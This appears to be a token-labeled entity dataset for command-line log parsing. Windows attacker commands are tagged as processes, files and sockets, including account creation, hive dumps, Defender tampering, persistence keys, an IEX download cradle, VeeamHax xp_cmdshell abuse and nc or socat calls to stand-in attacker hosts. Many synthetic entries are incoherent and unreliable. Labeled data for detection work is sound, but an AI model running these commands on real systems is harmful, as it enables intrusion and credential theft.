+ADMINS" I-File
+NONAME O
+/DOMAIN O
+/ADD O
+
+C:\WINDOWS\SYSTEM32\NET1 B-Process
+USER O
+NONAME O
+SLEPOY_123 O
+/DOMAIN O
+/ADD O
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe B-Process
+/noconfig O
+/fullpaths O
+@"C:\Users<REDACTED>\AppData\Local\Temp\npfdesjp\npfdesjp.cmdline" B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+systeminfo B-Process
+
+C:\Windows\system32\bitsadmin.exe B-Process
+/transfer O
+debjob O
+/download O
+/priority O
+normal O
+\DOMIANCONTROLLER\c$\windows\DOMAINNAME.exe B-File
+C:\Windows\DOMAINNAME.exe B-File
+
+C:\Windows\system32\bitsadmin.exe B-Process
+/transfer O
+debjob O
+/download O
+/priority O
+normal O
+\DOMIANCONTROLLER\c$\windows\DOMAINNAME.exe B-File
+C:\Windows\DOMAINNAME.exe B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+WMIC B-Process
+/node:"DC.DOMAIN.local" B-Socket
+process O
+call O
+create O
+"cmd B-Process
+/c O
+C:\PerfLogs\servisess.exe" B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+adfind.exe B-Process
+-f O
+"(objectcategory=group)" O
+> O
+ad_group.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+adfind.exe B-Process
+-f O
+"(objectcategory=organizationalUnit)" O
+> O
+ad_ous.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+adfind.exe B-Process
+-f O
+"(objectcategory=person)" O
+> O
+ad_users.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+adfind.exe B-Process
+-f O
+"objectcategory=computer" O
+> O
+ad_computers.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+adfind.exe B-Process
+-gcb O
+-sc O
+trustdmp B-File
+> O
+trustdmp.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+adfind.exe B-Process
+-sc O
+trustdmp B-File
+> O
+trustdmp.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+adfind.exe B-Process
+-subnets O
+-f O
+(objectCategory=subnet)> O
+subnets.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+cmd B-Process
+/c O
+vssadmin B-Process
+create O
+shadow O
+/for=C: O
+2>&1 O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+dir B-Process
+\Server\c$ B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ipconfig B-Process
+/all O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+group O
+"Domain B-File
+Computers" I-File
+/domain O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+group O
+/domain O
+"Domain B-File
+Admins" I-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+group O
+/domain O
+"Enterprise B-File
+Admins" I-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+users O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+nltest B-Process
+/dclist:"DOMAINNAME" B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+rundll32 B-Process
+C:\Windows\system32\SQL.dll, B-File
+StartW O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+vssadmin B-Process
+create O
+shadow O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+vssadmin B-Process
+create O
+shadow O
+/for=C: O
+2>&1 O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+vssadmin B-Process
+list O
+shadows O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/node:"REDACTED" B-Socket
+process O
+call O
+create O
+"c:\windows\system32\rundll32.exe B-Process
+c:\windows\temp\1.dll, B-File
+DllRegisterServer O
+
+C:\Windows\system32\cmd.exe B-Process
+/K O
+copy B-Process
+ttsel.exe B-File
+\<IP>\c$\windows\temp\ B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+C:\Perflogs\434.bat B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+echo B-Process
+92d8cc45954 O
+> O
+\\.\pipe\446b3c B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+echo B-Process
+92d8cc45954 O
+>; O
+\.\pipe\446b3c B-Socket
+
+C:\Windows\system32\reg.exe B-Process
+ADD O
+"HKLM\SOFTWARE\Microsoft\Microsoft I-File
+Antimalware\Exclusions\Paths" I-File
+/f O
+/t O
+REG_DWORD O
+/v O
+"C:\ProgramData\Microsoft\Oweboiqnb" B-File
+/d O
+"0" O
+
+C:\Windows\system32\reg.exe B-Process
+ADD O
+"HKLM\SOFTWARE\Microsoft\Windows I-File
+Defender\Exclusions\Paths" I-File
+/f O
+/t O
+REG_DWORD O
+/v O
+"C:\ProgramData\Microsoft\Oweboiqnb" B-File
+/d O
+"0" O
+
+C:\Windows\system32\schtasks.exe B-Process
+/run O
+/tn O
+MicrosoftEdgeUpdateTaskMachineUC B-Process
+
+C:\Windows\system32\svchost.exe B-Process
+-k O
+ClipboardSvcGroup O
+-p O
+-s O
+cbdhsvc O
+
+C:\Windows\system32\taskmgr.exe B-Process
+/4 O
+
+C:\\Windows\\System32\\wbem\\wmic.exe B-Process
+/node:REDACTED B-Socket
+process O
+call O
+create O
+"cmd.exe B-Process
+/c O
+powershell.exe B-Process
+-nop O
+-w O
+hidden O
+-c O
+IEX O
+((new-object O
+net.webclient).downloadstring('https://aicsoftware[.]com:757/coin'))" B-Socket
+
+C:\\Windows\\system32\\cmd.exe B-Process
+/c O
+C:\\Users\\USER~1\\AppData\\Local\\Temp\\J10B9.cmd B-File
+> O
+C:\\Users\\USER~1\\AppData\\Local\\Temp\\yp710BA.tmp B-File
+2> O
+C:\\Users\\USER~1\\AppData\\Local\\Temp\\1N10CB.tmp B-File
+
+C:\Windows\system32\net.exe B-Process
+group O
+"domain B-File
+admins" I-File
+/domain O
+
+C:\\Windows\\system32\\schtasks.exe B-Process
+/run O
+/tn O
+"Zvhlxdonjwfvei" B-File
+
+C:\\Windows\\system32\\whoami.exe B-Process
+/user O
+
+C:\\Windows\\system32\\whoami.exe B-Process
+/groups O
+
+REG B-Process
+ADD O
+"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" B-File
+/V O
+"microsoft O
+update" O
+/t O
+REG_SZ O
+/F O
+/D O
+"SCHTASKS B-Process
+/run O
+/tn O
+9T6ukfi6" B-Process
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+DisableAntiSpyware O
+/t O
+REG_DWORD O
+/d O
+1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\Software\Microsoft\Windows B-File
+NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" I-File
+/v O
+Adminv$ O
+/t O
+REG_DWORD O
+/d O
+0 O
+
+REG B-Process
+QUERY O
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection I-File
+/v O
+EnableLUA O
+
+Seatbelt.exe B-Process
+-group=all O
+-outputfile="C:\ProgramData\seatinfo.txt" B-File
+
+VeeamHax.exe B-Process
+--verbose O
+--target O
+<backup B-Socket
+server> I-Socket
+--port O
+9401 O
+--cmd O
+"c:\windows\notepad.exe" B-Process
+--sql O
+"EXEC O
+master..xp_cmdshell O
+'net B-Process
+localgroup O
+administrators O
+sqlbackup B-Process
+/add'" O
+
+VeeamHax.exe B-Process
+--verbose O
+--target O
+<backup B-Socket
+server> I-Socket
+--port O
+9401 O
+--cmd O
+"c:\windows\notepad.exe" B-Process
+--sql O
+"EXEC O
+master..xp_cmdshell O
+'net B-Process
+user O
+sqlbackup B-Process
+Password!1221! O
+/add'" O
+
+VeeamHax.exe B-Process
+--verbose O
+--target O
+<backup B-Socket
+server> I-Socket
+--port O
+9401 O
+--cmd O
+"c:\windows\notepad.exe" B-Process
+--sql O
+"EXEC O
+sp_configure O
+'show O
+advanced O
+options', O
+'1'" O
+
+VeeamHax.exe B-Process
+--verbose O
+--target O
+<backup B-Socket
+server> I-Socket
+--port O
+9401 O
+--cmd O
+"c:\windows\notepad.exe" B-Process
+--sql O
+"EXEC O
+sp_configure O
+'xp_cmdshell', O
+'1' O
+" O
+
+VeeamHax.exe B-Process
+--verbose O
+--target O
+<backup B-Socket
+server> I-Socket
+--port O
+9401 O
+--cmd O
+"c:\windows\notepad.exe" B-Process
+--sql O
+"RECONFIGURE" O
+
+VeeamHax.exe B-Process
+--verbose O
+--target O
+<backup B-Socket
+server> I-Socket
+--port O
+9401 O
+--cmd O
+"c:\windows\notepad.exe" B-Process
+--sql O
+"select O
+@@version" O
+
+WMIC B-Process
+/Node:localhost B-Socket
+/Namespace:"\\root\SecurityCenter2" B-File
+Path O
+AntiVirusProduct O
+Get O
+displayName O
+/Format:List O
+
+WMIC B-Process
+/Node:localhost B-Socket
+/Namespace:\\root\SecurityCenter2 B-File
+Path O
+AntiVirusProduct O
+Get O
+displayName O
+/Format:List O
+
+WMIC B-Process
+/node:"DC.example.domain" B-Socket
+process O
+call O
+create O
+"rundll32 B-Process
+C:\PerfLogs\arti64.dll, B-File
+StartW" I-File
+
+WMIC B-Process
+/node:"DC.example.domain" B-Socket
+process O
+call O
+create O
+"rundll32 B-Process
+C:\\PerfLogs\\arti64.dll, B-File
+StartW" I-File
+
+adfind B-Process
+-f O
+objectcategory=computer O
+-csv O
+name O
+cn O
+OperatingSystem O
+dNSHostName O
+> O
+some.csv B-File
+
+adfind.exe B-Process
+-f O
+objectcategory=computer O
+-csv O
+name O
+operatingSystem O
+
+bcdedit B-Process
+/set O
+{default} O
+safeboot B-File
+network O
+
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe B-Process
+veeam1.cs.txt B-File
+
+c:\windows\system32\cmd.exe B-Process
+/c O
+wmic B-Process
+/node:"<REDACTED>" B-Socket
+process O
+call O
+create O
+"c:\perflogs\setup1.exe" B-File
+
+c:\windows\temp\k.exe B-Process
+--config O
+REDACTED O
+
+cd B-Process
+/d O
+"C:\Users\SVC-DA-1\AppData\Local\Temp\10\tmp$\Downloads" B-File
+
+certutil_0.exe B-Process
+-encode O
+input_0.txt B-File
+C:\temp\encoded_0.txt B-File
+
+certutil_22.exe B-Process
+-urlcache O
+-split O
+-f O
+http://malicious.site/data_22.enc B-Socket
+C:\Temp\temp_22.enc B-File
+
+certutil_25.exe B-Process
+-encode O
+input_25.txt B-File
+C:\temp\encoded_25.txt B-File
+
+certutil_27.exe B-Process
+-encode O
+input_27.txt B-File
+C:\temp\encoded_27.txt B-File
+
+certutil_29.exe B-Process
+-encode O
+input_29.txt B-File
+C:\temp\encoded_29.txt B-File
+
+certutil_36.exe B-Process
+-encode O
+input_36.txt B-File
+C:\temp\encoded_36.txt B-File
+
+certutil_40.exe B-Process
+-encode O
+input_40.txt B-File
+C:\temp\encoded_40.txt B-File
+
+certutil_59.exe B-Process
+-urlcache O
+-split O
+-f O
+http://malicious.site/data_59.enc B-Socket
+C:\Temp\temp_59.enc B-File
+
+certutil_76.exe B-Process
+-encode O
+input_76.txt B-File
+C:\temp\encoded_76.txt B-File
+
+certutil_81.exe B-Process
+-urlcache O
+-split O
+-f O
+http://malicious.site/data_81.enc B-Socket
+C:\Temp\temp_81.enc B-File
+
+certutil_82.exe B-Process
+-encode O
+input_82.txt B-File
+C:\temp\encoded_82.txt B-File
+
+certutil_88.exe B-Process
+-encode O
+input_88.txt B-File
+C:\temp\encoded_88.txt B-File
+
+certutil_93.exe B-Process
+-encode O
+input_93.txt B-File
+C:\temp\encoded_93.txt B-File
+
+cmd B-Process
+/C O
+"echo B-Process
+-------- O
+>> O
+C:\Users<REDACTED>\AppData\Local\Temp\BD2C.bin1" B-File
+
+cmd B-Process
+/C O
+"net B-Process
+view O
+/all O
+>> O
+C:\Users<REDACTED>\AppData\Local\Temp\BD2C.bin1" B-File
+
+cmd B-Process
+/v O
+/c O
+net B-Process
+group O
+/domain O
+"Domain B-File
+Admins" I-File
+> O
+"%TEMP%\51362.txt" B-File
+2>&1 O
+
+cmd B-Process
+/v O
+/c O
+nltest B-Process
+/trusted_domains O
+> O
+"%TEMP%\22041.txt" B-File
+2>&1 O
+
+cmd B-Process
+/v O
+/c O
+nltest B-Process
+/trusted_domains O
+> O
+"%TEMP%\22041.txt" B-File
+2>&1 O
+
+cmd B-Process
+/v O
+/c O
+whoami O
+/upn O
+> O
+"%TEMP%\26906.txt" B-File
+2>&1 O
+
+cmd.exe B-Process
+-Command O
+"Start-Process O
+C:\Users\Public\runme.bat" B-File
+
+cmd.exe B-Process
+-Command O
+"Start-Process O
+C:\Windows\Temp\evil.dll" B-File
+
+cmd.exe B-Process
+-exec O
+/tmp/malware.sh B-File
+
+cmd.exe B-Process
+-exec O
+/usr/local/bin/backdoor B-File
+
+cmd.exe B-Process
+-exec O
+/var/tmp/hide.so B-File
+
+cmd.exe B-Process
+-exec O
+C:\ProgramData\updater.exe B-File
+
+cmd.exe B-Process
+-exec O
+C:\Users\Public\runme.bat B-File
+
+cmd.exe B-Process
+/C O
+"python.exe B-Process
+cradle.py" B-File
+
+cmd.exe B-Process
+/C O
+adfind.exe B-Process
+-f O
+objectcategory=computer O
+-csv O
+name O
+cn O
+OperatingSystem O
+dNSHostName O
+> O
+some.csv B-File
+
+cmd.exe B-Process
+/C O
+dsquery B-Process
+subnet O
+-limit O
+0 O
+
+cmd.exe B-Process
+/C O
+echo B-Process
+-------- O
+>> O
+C:\Users<REDACTED>\AppData\Local\Temp\BD2C.bin1 B-File
+
+cmd.exe B-Process
+/C O
+for O
+/f O
+%a O
+in O
+(pc.txt) B-File
+do O
+copy O
+/y O
+\\<REDACTED>\c$\<REDACTED>.exe B-Socket
+\\%a\c$\<REDACTED>.exe B-Socket
+
+cmd.exe B-Process
+/C O
+net B-Process
+view O
+/all O
+>> O
+C:\Users<REDACTED>\AppData\Local\Temp\BD2C.bin1 B-File
+
+cmd.exe B-Process
+/C O
+netsh B-Process
+advfirewall O
+set O
+rule O
+group="remote B-Socket
+desktop" I-Socket
+new O
+enable=Yes O
+
+cmd.exe B-Process
+/C O
+netsh B-Process
+firewall O
+set O
+rule O
+group="remote B-Socket
+desktop" I-Socket
+new O
+enable=Yes O
+
+cmd.exe B-Process
+/C O
+netsh B-Process
+firewall O
+set O
+service O
+type=remotedesktop O
+mode=enable O
+
+cmd.exe B-Process
+/C O
+nltest B-Process
+/dclist: O
+
+cmd.exe B-Process
+/C O
+nltest B-Process
+/domain_trusts O
+
+nltest B-Process
+/dclist: O
+
+c:\windows\sysnative\nltest B-Process
+/domain_trusts O
+
+c:\windows\sysnative\nltest B-Process
+/dclist: O
+
+cmd.exe B-Process
+/C O
+python.exe B-Process
+cradle.py B-File
+
+cmd.exe B-Process
+/c O
+"reg.exe B-Process
+save O
+hklm\sam B-File
+c:\users\REDACTED\appdata\local\temp\1\dznuxujzr" B-File
+
+cmd.exe B-Process
+/c O
+"reg.exe B-Process
+save O
+hklm\security B-File
+c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt" B-File
+
+cmd.exe B-Process
+/c O
+"reg.exe B-Process
+save O
+hklm\system B-File
+c:\users\REDACTED\appdata\local\temp\1\mkffdg" B-File
+
+cmd.exe B-Process
+/c O
+%USERPROFILE%\AppData\bigfile.exe B-Process
+-i O
+-c O
+%USERPROFILE%\AppData\1.bat B-File
+
+cmd.exe B-Process
+/c O
+DEL B-Process
+%USERPROFILE%\AppData\1.bat B-File
+
+cmd.exe B-Process
+/c O
+DEL B-Process
+%USERPROFILE%\AppData\bigfile.exe B-File
+
+cmd.exe B-Process
+/c O
+DEL B-Process
+%USERPROFILE%\AppData\bigfile.txt B-File
+
+cmd.exe B-Process
+/c O
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion\Image I-File
+File I-File
+Execution I-File
+Options\smss.exe" I-File
+/f O
+/v O
+Debugger O
+/t O
+REG_SZ O
+/d O
+"C:\windows\system32\svchost.exe" B-File
+
+cmd.exe B-Process
+/c O
+certutil B-Process
+-decode O
+%USERPROFILE%\AppData\bigfile.txt B-File
+%USERPROFILE%\AppData\bigfile.exe B-File
+
+cmd.exe B-Process
+/c O
+echo B-Process
+31b925aa0f7 O
+> O
+\\.\pipe\8945a5 B-Socket
+
+cmd.exe B-Process
+/c O
+mofcomp.exe B-Process
+C:\Windows\SERVIC\~1\MSSQL$\~1\AppData\Local\Temp\xitmf B-File
+
+cmd.exe B-Process
+/c O
+mofcomp.exe B-Process
+C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\xitmf B-File
+
+cmd.exe B-Process
+/c O
+reg.exe B-Process
+save O
+hklm\sam B-File
+c:\users\REDACTED\appdata\local\temp\1\dznuxujzr B-File
+
+cmd.exe B-Process
+/c O
+reg.exe B-Process
+save O
+hklm\security B-File
+c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt B-File
+
+cmd.exe B-Process
+/c O
+reg.exe B-Process
+save O
+hklm\system B-File
+c:\users\REDACTED\appdata\local\temp\1\mkffdg B-File
+
+cmd.exe B-Process
+/c O
+rmdir B-Process
+/S O
+/Q O
+"C:\Windows\system32\config\systemprofile\EmailStorage_REDACTED-REDACTED_REDACTED" B-File
+
+cmd.exe B-Process
+/c O
+start B-Process
+/tmp/malware.sh B-File
+
+cmd.exe B-Process
+/c O
+start B-Process
+/var/tmp/hide.so B-File
+
+cmd.exe B-Process
+/c O
+start B-Process
+C:\Windows\Temp\evil.dll B-File
+
+cmd.exe B-Process
+/c O
+start B-Process
+cmd.exe B-Process
+
+cmd.exe B-Process
+/c O
+start B-Process
+powershell.exe B-Process
+
+cmd.exe B-Process
+/c O
+start B-Process
+python.exe B-Process
+
+cmd.exe B-Process
+/c O
+start B-Process
+svchost.exe B-Process
+
+cmd.exe B-Process
+/c O
+start B-Process
+wmic.exe B-Process
+
+cmd.exe B-Process
+/c O
+wevtutil B-Process
+cl O
+applicatio O
+
+cmd.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+notepad.exe B-Process
+
+cmd.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+svchost.exe B-Process
+
+cmd.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+taskmgr.exe B-Process
+
+cmd.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+winlogon.exe B-Process
+
+cmd.exe B-Process
+Invoke-WebRequest O
+-Uri O
+10.10.10.10:4444 B-Socket
+-Method O
+POST O
+
+cmd.exe B-Process
+Invoke-WebRequest O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Method O
+POST O
+
+cmd.exe B-Process
+Invoke-WebRequest O
+-Uri O
+http://attacker.com/c2 B-Socket
+-Method O
+POST O
+
+cmd.exe B-Process
+Remove-Item O
+/var/tmp/hide.so B-File
+-Force O
+
+cmd.exe B-Process
+Remove-Item O
+C:\ProgramData\updater.exe B-File
+-Force O
+
+cmd.exe B-Process
+Remove-Item O
+C:\Users\Public\runme.bat B-File
+-Force O
+
+cmd.exe B-Process
+Set-ProcessInjection O
+-Target O
+explorer.exe B-Process
+
+cmd.exe B-Process
+Set-ProcessInjection O
+-Target O
+lsass.exe B-Process
+
+cmd.exe B-Process
+Set-ProcessInjection O
+-Target O
+notepad.exe B-Process
+
+cmd.exe B-Process
+Set-ProcessInjection O
+-Target O
+taskmgr.exe B-Process
+
+cmd.exe B-Process
+Stop-Process O
+-Name O
+lsass.exe B-Process
+-Force O
+
+cmd.exe B-Process
+Stop-Process O
+-Name O
+notepad.exe B-Process
+-Force O
+
+cmd.exe B-Process
+Stop-Process O
+-Name O
+svchost.exe B-Process
+-Force O
+
+cmd.exe B-Process
+Stop-Process O
+-Name O
+taskmgr.exe B-Process
+-Force O
+
+cmd.exe B-Process
+Stop-Process O
+-Name O
+winlogon.exe B-Process
+-Force O
+
+cmd.exe B-Process
+attrib B-Process
++s O
++h O
+/usr/local/bin/backdoor B-File
+
+cmd.exe B-Process
+attrib B-Process
++s O
++h O
+C:\ProgramData\updater.exe B-File
+
+cmd.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Users\Public\runme.bat B-File
+
+cmd.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Windows\Temp\evil.dll B-File
+
+cmd.exe B-Process
+chmod B-Process
+777 O
+/tmp/malware.sh B-File
+
+cmd.exe B-Process
+chmod B-Process
+777 O
+C:\Windows\Temp\evil.dll B-File
+
+cmd.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+10.10.10.10:4444 B-Socket
+
+cmd.exe B-Process
+del B-Process
+/tmp/malware.sh B-File
+
+cmd.exe B-Process
+del B-Process
+/usr/local/bin/backdoor B-File
+
+cmd.exe B-Process
+del B-Process
+/var/tmp/hide.so B-File
+
+cmd.exe B-Process
+del B-Process
+C:\Users\Public\runme.bat B-File
+
+cmd.exe B-Process
+del B-Process
+C:\Windows\Temp\evil.dll B-File
+
+cmd.exe B-Process
+dllinjector.exe B-Process
+-p O
+explorer.exe B-Process
+-d O
+payload.dll B-File
+
+cmd.exe B-Process
+dllinjector.exe B-Process
+-p O
+lsass.exe B-Process
+-d O
+payload.dll B-File
+
+cmd.exe B-Process
+dllinjector.exe B-Process
+-p O
+svchost.exe B-Process
+-d O
+payload.dll B-File
+
+cmd.exe B-Process
+dllinjector.exe B-Process
+-p O
+winlogon.exe B-Process
+-d O
+payload.dll B-File
+
+cmd.exe B-Process
+icacls B-Process
+/tmp/malware.sh B-File
+/grant O
+Everyone:F O
+
+cmd.exe B-Process
+icacls B-Process
+/usr/local/bin/backdoor B-File
+/grant O
+Everyone:F O
+
+cmd.exe B-Process
+icacls B-Process
+/var/tmp/hide.so B-File
+/grant O
+Everyone:F O
+
+cmd.exe B-Process
+icacls B-Process
+C:\ProgramData\updater.exe B-File
+/grant O
+Everyone:F O
+
+cmd.exe B-Process
+kill O
+$(Get-Process O
+lsass.exe.Id) B-Process
+
+cmd.exe B-Process
+kill O
+$(Get-Process O
+notepad.exe.Id) B-Process
+
+cmd.exe B-Process
+kill O
+$(Get-Process O
+svchost.exe.Id) B-Process
+
+cmd.exe B-Process
+kill O
+$(Get-Process O
+winlogon.exe.Id) B-Process
+
+cmd.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+http://attacker.com/c2 B-Socket
+
+cmd.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+https://evil.server/payload B-Socket
+
+cmd.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+10.10.10.10:4444 B-Socket
+-Body O
+'cmd=whoami'" O
+
+cmd.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Body O
+'cmd=whoami'" O
+
+cmd.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+https://evil.server/payload B-Socket
+-Body O
+'cmd=whoami'" O
+
+cmd.exe B-Process
+powershell B-Process
+Start-Process O
+python.exe B-Process
+
+cmd.exe B-Process
+powershell B-Process
+Start-Process O
+rundll32.exe B-Process
+
+cmd.exe B-Process
+powershell B-Process
+Start-Process O
+svchost.exe B-Process
+
+cmd.exe B-Process
+powershell B-Process
+Start-Process O
+wmic.exe B-Process
+
+cmd.exe B-Process
+python3 B-Process
+-m O
+http.server B-File
+8080 I-File
+--bind O
+10.10.10.10:4444 B-Socket
+
+cmd.exe B-Process
+python3 B-Process
+-m O
+http.server B-File
+8080 I-File
+--bind O
+http://attacker.com/c2 B-Socket
+
+cmd.exe B-Process
+rm B-Process
+/var/tmp/hide.so B-File
+
+cmd.exe B-Process
+rm B-Process
+C:\ProgramData\updater.exe B-File
+
+cmd.exe B-Process
+rm B-Process
+C:\Users\Public\runme.bat B-File
+
+cmd.exe B-Process
+runas O
+/user:admin O
+cmd.exe B-Process
+
+cmd.exe B-Process
+runas O
+/user:admin O
+powershell.exe B-Process
+
+cmd.exe B-Process
+runas O
+/user:admin O
+rundll32.exe B-Process
+
+cmd.exe B-Process
+runas O
+/user:admin O
+wmic.exe B-Process
+
+cmd.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+http://attacker.com/c2 B-Socket
+
+cmd.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+https://evil.server/payload B-Socket
+
+cmd.exe B-Process
+taskkill B-Process
+/IM O
+explorer.exe B-Process
+/F O
+
+cmd.exe B-Process
+taskkill B-Process
+/IM O
+taskmgr.exe B-Process
+/F O
+
+cmd.exe B-Process
+taskkill B-Process
+/IM O
+winlogon.exe B-Process
+/F O
+
+cmd_10.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_10.bat B-File
+
+cmd_11.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_11.txt B-File
+
+cmd_12.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_12.bat B-File
+
+cmd_13.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_13.txt B-File
+
+cmd_17.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_17.bat B-File
+
+cmd_18.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_18.bat B-File
+
+cmd_2.exe B-Process
+/c O
+type O
+C:\Windows\System32\drivers\etc\hosts B-File
+
+cmd_3.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_3.txt B-File
+
+cmd_3.exe B-Process
+/c O
+type O
+C:\Windows\System32\drivers\etc\hosts B-File
+
+cmd_35.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_35.bat B-File
+
+cmd_35.exe B-Process
+/c O
+type O
+C:\Windows\System32\drivers\etc\hosts B-File
+
+cmd_45.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_45.txt B-File
+
+cmd_5.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_5.bat B-File
+
+cmd_51.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_51.bat B-File
+
+cmd_55.exe B-Process
+/c O
+type O
+C:\Windows\System32\drivers\etc\hosts B-File
+
+cmd_57.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_57.bat B-File
+
+cmd_61.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_61.txt B-File
+
+cmd_62.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_62.bat B-File
+
+cmd_7.exe B-Process
+/c O
+echo B-Process
+malicious O
+> O
+C:\Temp\evil_7.bat B-File
+
+cmd_74.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_74.txt B-File
+
+cmd_76.exe B-Process
+/c O
+type O
+C:\Windows\System32\drivers\etc\hosts B-File
+
+cmd_78.exe B-Process
+/c O
+type O
+C:\Windows\System32\drivers\etc\hosts B-File
+
+cmd_84.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_84.txt B-File
+
+cmd_87.exe B-Process
+/c O
+type O
+C:\Windows\System32\drivers\etc\hosts B-File
+
+cmd_91.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_91.txt B-File
+
+cmd_94.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_94.txt B-File
+
+cmd_95.exe B-Process
+/c O
+echo B-Process
+%USERNAME% O
+>> O
+C:\output\users_95.txt B-File
+
+cmd_98.exe B-Process
+/c O
+type O
+C:\Windows\System32\drivers\etc\hosts B-File
+
+cscript.exe B-Process
+/b O
+/e:VBScript.Encode B-File
+C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\xit B-File
+579562847 O
+
+cscript.exe B-Process
+/b O
+/e\:VBScript.Encode B-File
+C:\Windows\SERVIC\~1\MSSQL$\~1\AppData\Local\Temp\xit B-File
+579562
+
+esentutl.exe B-Process
+/r O
+V01 O
+/l"C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache" B-File
+/s"C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache" B-File
+/d"C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache" B-File
+
+ex.exe B-Process
+x O
+-prootBRUCE O
+-y O
+C:\Windows\<REDACTED>\AppData\Local\Temp\istx64f.rar B-File
+C:\Windows\<REDACTED>\AppData\Local\Temp\mstrx\<file> B-File
+
+findstr B-Process
+/C:"The O
+operation O
+completed O
+successfully." O
+
+ftp_19.exe B-Process
+-s:script_19.txt B-File
+C:\inetpub\wwwroot\ftp_19.log B-File
+
+ftp_41.exe B-Process
+-s:script_41.txt B-File
+C:\inetpub\wwwroot\ftp_41.log B-File
+
+ftp_55.exe B-Process
+-s:script_55.txt B-File
+C:\inetpub\wwwroot\ftp_55.log B-File
+
+ftp_63.exe B-Process
+-s:script_63.txt B-File
+C:\inetpub\wwwroot\ftp_63.log B-File
+
+ftp_67.exe B-Process
+-s:script_67.txt B-File
+C:\inetpub\wwwroot\ftp_67.log B-File
+
+ftp_73.exe B-Process
+-s:script_73.txt B-File
+C:\inetpub\wwwroot\ftp_73.log B-File
+
+ftp_87.exe B-Process
+-s:script_87.txt B-File
+C:\inetpub\wwwroot\ftp_87.log B-File
+
+ftp_90.exe B-Process
